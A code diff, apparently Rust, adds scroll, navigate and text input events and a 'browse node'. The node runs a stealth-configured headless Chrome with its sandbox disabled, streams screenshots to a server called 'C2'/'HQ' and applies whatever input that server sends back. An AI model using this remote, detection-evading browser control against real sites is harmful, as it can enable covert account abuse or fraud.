@@ -113,6 +113,10 @@ document.getElementById('login').addEventListener('submit', function (e) {
 const WIRE_VERSION: u8 = 1;
 const KIND_MOUSE: u8 = 1;
 const KIND_KEY: u8 = 2;
+const KIND_SCROLL: u8 = 3;
+const KIND_NAV: u8 = 4;
+const KIND_TEXT: u8 = 5;
+const MAX_URL_LEN: usize = 2048;
 
 const MOUSE_MOVE: u8 = 1;
 const MOUSE_DOWN: u8 = 2;
@@ -164,6 +168,12 @@ pub enum InputEvent {
         action: KeyAction,
         key: String,
     },
+    /// Wheel scroll with CSS-pixel deltas at the pointer position (x, y).
+    Scroll { x: f64, y: f64, dx: f64, dy: f64 },
+    /// Navigate the page to a URL.
+    Navigate { url: String },
+    /// Type text one character at a time (never submits anything by itself).
+    Text { text: String },
 }
 
 #[derive(Debug)]
@@ -204,6 +214,32 @@ pub fn encode_input(event: &InputEvent) -> Result<Vec<u8>, StreamError> {
             out.push(KIND_KEY);
             out.push(key_action_byte(*action));
             out.push(u8::try_from(bytes.len()).unwrap_or(0));
+            out.extend_from_slice(bytes);
+        }
+        InputEvent::Scroll { x, y, dx, dy } => {
+            // version, kind, one pad byte, then x, y, dx, dy as f32 little endian: 19 bytes
+            out.push(KIND_SCROLL);
+            out.push(0);
+            for v in [x, y, dx, dy] {
+                out.extend_from_slice(&(*v as f32).to_le_bytes());
+            }
+        }
+        InputEvent::Navigate { url } => {
+            let bytes = url.as_bytes();
+            if bytes.is_empty() || bytes.len() > MAX_URL_LEN {
+                return Err(StreamError(format!("url length {} is outside 1..={MAX_URL_LEN}", bytes.len())));
+            }
+            out.push(KIND_NAV);
+            out.extend_from_slice(&(bytes.len() as u16).to_le_bytes());
+            out.extend_from_slice(bytes);
+        }
+        InputEvent::Text { text } => {
+            let bytes = text.as_bytes();
+            if bytes.is_empty() || bytes.len() > MAX_URL_LEN {
+                return Err(StreamError(format!("text length {} is outside 1..={MAX_URL_LEN}", bytes.len())));
+            }
+            out.push(KIND_TEXT);
+            out.extend_from_slice(&(bytes.len() as u16).to_le_bytes());
             out.extend_from_slice(bytes);
         }
     }
@@ -254,6 +290,27 @@ pub fn decode_input(bytes: &[u8]) -> Result<InputEvent, StreamError> {
                 .map_err(|_| StreamError("key is not utf-8".into()))?
                 .to_owned();
             Ok(InputEvent::Key { action, key })
+        }
+        KIND_SCROLL => {
+            if bytes.len() != 19 {
+                return Err(StreamError(format!("scroll input must be 19 bytes, got {}", bytes.len())));
+            }
+            let f = |i: usize| f32::from_le_bytes([bytes[i], bytes[i + 1], bytes[i + 2], bytes[i + 3]]) as f64;
+            Ok(InputEvent::Scroll { x: f(3), y: f(7), dx: f(11), dy: f(15) })
+        }
+        KIND_NAV | KIND_TEXT => {
+            let len = usize::from(u16::from_le_bytes([bytes[2], bytes[3]]));
+            if len == 0 || len > MAX_URL_LEN || bytes.len() != 4 + len {
+                return Err(StreamError(format!("length mismatch: header {len}, bytes {}", bytes.len())));
+            }
+            let value = std::str::from_utf8(&bytes[4..4 + len])
+                .map_err(|_| StreamError("value is not utf-8".into()))?
+                .to_owned();
+            if bytes[1] == KIND_NAV {
+                Ok(InputEvent::Navigate { url: value })
+            } else {
+                Ok(InputEvent::Text { text: value })
+            }
         }
         other => Err(StreamError(format!("unknown input kind {other}"))),
     }
@@ -323,6 +380,14 @@ pub fn plan_cdp(event: &InputEvent) -> Result<Vec<String>, StreamError> {
             format!("Input.dispatchKeyEvent type=keyDown key={key}"),
             format!("Input.dispatchKeyEvent type=keyUp key={key}"),
         ]),
+        InputEvent::Scroll { x, y, dx, dy } => Ok(vec![format!(
+            "Input.dispatchMouseEvent type=mouseWheel x={x} y={y} deltaX={dx} deltaY={dy}"
+        )]),
+        InputEvent::Navigate { url } => Ok(vec![format!("Page.navigate url={url}")]),
+        InputEvent::Text { text } => Ok(vec![format!(
+            "Input.dispatchKeyEvent chars={}",
+            text.chars().count()
+        )]),
     }
 }
 
@@ -364,6 +429,15 @@ pub async fn apply_input(page: &StealthPage, event: &InputEvent) -> Result<Vec<S
             return Err(StreamError("unreachable after plan_cdp".into()));
         }
         InputEvent::Key { key, .. } => page.key_press(key).await.map_err(browser_err)?,
+        InputEvent::Scroll { x, y, dx, dy } => {
+            page.wheel(*x, *y, *dx, *dy).await.map_err(browser_err)?
+        }
+        InputEvent::Navigate { url } => page.goto(url).await.map_err(browser_err)?,
+        InputEvent::Text { text } => {
+            for ch in text.chars() {
+                page.key_press(&ch.to_string()).await.map_err(browser_err)?;
+            }
+        }
     }
     Ok(planned)
 }
@@ -1310,6 +1384,18 @@ pub async fn run_login_node(options: LoginNodeOptions) -> Result<NodeProof, Stre
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn scroll_navigate_and_text_round_trip() {
+        for event in [
+            InputEvent::Scroll { x: 640.0, y: 360.0, dx: 0.0, dy: 400.0 },
+            InputEvent::Navigate { url: "https://example.org/a?b=1".into() },
+            InputEvent::Text { text: "dummy@example.invalid".into() },
+        ] {
+            let bytes = encode_input(&event).unwrap();
+            assert_eq!(decode_input(&bytes).unwrap(), event);
+        }
+    }
+
     use super::*;
 
     fn click(x: f64, y: f64, button: MouseButton) -> InputEvent {
@@ -1420,4 +1506,122 @@ mod tests {
             .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).unwrap())
             .collect()
     }
+}
+
+/// Options for [`run_browse_node`]: a real page streamed to HQ, driven by HQ input.
+pub struct BrowseNodeOptions {
+    pub c2: String,
+    pub session: String,
+    pub profile: PathBuf,
+    pub evidence: PathBuf,
+    pub start_url: String,
+    pub duration: Duration,
+}
+
+/// Open `start_url` in Chrome, stream PNG frames to C2 continuously and apply every
+/// input event that comes back (click, scroll, key, text, navigate). Each applied
+/// event is logged with the page URL and title that followed it. Nothing is
+/// submitted by this function; what HQ sends is what happens.
+pub async fn run_browse_node(options: BrowseNodeOptions) -> Result<(), StreamError> {
+    if let Some(parent) = options.evidence.parent() {
+        std::fs::create_dir_all(parent).map_err(|e| StreamError(e.to_string()))?;
+    }
+    std::fs::create_dir_all(&options.profile).map_err(|e| StreamError(e.to_string()))?;
+    let endpoints = c2_endpoints(&options.c2, &options.session, "node")?;
+    open_session_retry(&endpoints.post_url).await?;
+
+    let launch = LaunchConfig {
+        headless: true,
+        window_size: (1280, 720),
+        profile: BrowserProfile::Persistent(options.profile.clone()),
+        browser_pref: BrowserPreference::ChromeOnly,
+        renderer_sandbox: RendererSandboxMode::CompatibilityDisabled,
+        extra_args: vec!["--force-device-scale-factor=1".into()],
+        ..LaunchConfig::default()
+    };
+    let mut stealth = StealthConfig::default();
+    stealth.transparent = true;
+    let browser = StealthBrowser::launch_with(launch, stealth).await.map_err(browser_err)?;
+    let page = browser.new_page("about:blank").await.map_err(browser_err)?;
+    let mut log = String::new();
+    let mut note = |line: String| {
+        eprintln!("[stream-node] {line}");
+        log.push_str(&line);
+        log.push('\n');
+    };
+    if let Err(err) = tokio::time::timeout(Duration::from_secs(40), page.goto(&options.start_url)).await {
+        note(format!("start navigation timed out: {err}"));
+    }
+    tokio::time::sleep(Duration::from_secs(3)).await;
+    let href = eval_string(&page, "location.href").await.unwrap_or_default();
+    let title = eval_string(&page, "document.title").await.unwrap_or_default();
+    note(format!("start url={} href={href} title={title}", options.start_url));
+
+    let ws = connect_ws(&endpoints.ws_url).await?;
+    let (mut ws_write, mut ws_read) = ws.split();
+    let (frame_tx, mut frame_rx) = mpsc::channel::<Vec<u8>>(2);
+    let (event_tx, mut event_rx) = mpsc::unbounded_channel::<(u64, InputEvent)>();
+    let writer = tokio::spawn(async move {
+        while let Some(png) = frame_rx.recv().await {
+            if ws_write
+                .send(tokio_tungstenite::tungstenite::Message::binary(png))
+                .await
+                .is_err()
+            {
+                break;
+            }
+        }
+    });
+    let reader = tokio::spawn(async move {
+        use futures::StreamExt;
+        let mut seq = 0u64;
+        while let Some(msg) = ws_read.next().await {
+            match msg {
+                Ok(tokio_tungstenite::tungstenite::Message::Binary(data)) => match decode_input(&data) {
+                    Ok(event) => {
+                        seq += 1;
+                        let _ = event_tx.send((seq, event));
+                    }
+                    Err(err) => eprintln!("[stream-node] input decode failed: {err}"),
+                },
+                Ok(tokio_tungstenite::tungstenite::Message::Close(_)) | Err(_) => break,
+                Ok(_) => {}
+            }
+        }
+    });
+
+    let deadline = tokio::time::Instant::now() + options.duration;
+    let mut tick = tokio::time::interval(Duration::from_millis(500));
+    tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);
+    let mut frames = 0u64;
+    while tokio::time::Instant::now() < deadline {
+        tokio::select! {
+            _ = tick.tick() => {
+                if let Ok(png) = page.screenshot().await {
+                    if png.starts_with(&[0x89, b'P', b'N', b'G']) && frame_tx.try_send(png).is_ok() {
+                        frames += 1;
+                    }
+                }
+            }
+            event = event_rx.recv() => {
+                let Some((seq, event)) = event else { break };
+                let applied = match tokio::time::timeout(Duration::from_secs(45), apply_input(&page, &event)).await {
+                    Ok(Ok(lines)) => lines.join(" | "),
+                    Ok(Err(err)) => format!("error: {err}"),
+                    Err(_) => "error: timed out".to_owned(),
+                };
+                tokio::time::sleep(Duration::from_millis(1500)).await;
+                let href = eval_string(&page, "location.href").await.unwrap_or_default();
+                let title = eval_string(&page, "document.title").await.unwrap_or_default();
+                let focus = eval_string(&page, "(document.activeElement ? document.activeElement.tagName + (document.activeElement.type ? ':' + document.activeElement.type : '') : '')").await.unwrap_or_default();
+                note(format!("applied seq={seq} event={event:?} cdp=[{applied}] href={href} title={title} focus={focus} frames_sent={frames}"));
+            }
+        }
+    }
+    drop(frame_tx);
+    writer.abort();
+    reader.abort();
+    let _ = browser.close().await;
+    std::fs::write(&options.evidence, log).map_err(|e| StreamError(e.to_string()))?;
+    Ok(())
 }
